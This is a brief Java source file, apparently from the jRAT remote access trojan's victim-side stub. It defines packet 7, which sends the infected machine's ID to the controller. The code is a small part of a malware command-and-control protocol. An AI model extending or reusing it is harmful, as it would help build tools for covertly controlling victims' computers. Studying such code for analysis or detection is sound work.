package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;
import se.jrat.stub.Main;


public class Packet7InitServerID extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(Main.getID());
	}

	@Override
	public byte getPacketId() {
		return (byte) 7;
	}
}